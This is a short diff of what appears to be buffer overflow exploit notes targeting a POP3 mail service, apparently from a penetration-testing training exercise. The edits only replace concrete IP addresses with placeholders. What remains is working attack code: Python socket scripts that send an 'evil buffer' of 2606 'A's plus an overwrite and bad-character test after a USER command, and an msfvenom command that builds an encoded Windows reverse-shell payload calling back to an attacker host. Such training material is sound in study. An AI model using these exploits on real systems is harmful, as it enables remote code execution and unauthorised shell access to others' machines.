@@ -6,7 +6,7 @@ import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 try:  
          print "\nSending evil buffer..."  
-         s.connect(('IP',PORT))            # connect to IP, POP3 port  
+         s.connect(('IP',PORT))            # connect to IP, port  
          data = s.recv(1024)                     # receive banner  
          print data                              # print banner  
  
@@ -81,7 +81,7 @@ buffer ="A"*2606 + "B"*4 + badchars
 
 try:  
     print "\nSending evil buffer..."  
-    s.connect(('10.11.14.144',110))  
+    s.connect(('IP',PORT))  
     data = s.recv(1024)  
     s.send('USER username' +'\r\n')  
     data = s.recv(1024)  
@@ -132,4 +132,4 @@ try:
 except:  
     print "Could not connect to X!"  
 
- msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"  
+ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"  
